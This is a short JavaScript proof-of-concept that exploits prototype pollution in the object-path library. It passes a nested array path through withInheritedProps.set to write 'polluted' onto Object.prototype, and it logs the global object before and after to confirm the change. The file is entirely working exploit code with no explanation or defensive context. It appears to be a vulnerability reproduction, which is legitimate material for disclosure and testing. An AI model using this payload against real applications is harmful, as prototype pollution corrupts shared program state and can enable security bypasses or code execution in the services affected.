var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const objectPath = require('object-path');
console.log({}.polluted);
objectPath.withInheritedProps.set(obj, [
    ['constructor'],
    ['prototype'],
    'polluted'
], 'yes');
console.log({}.polluted);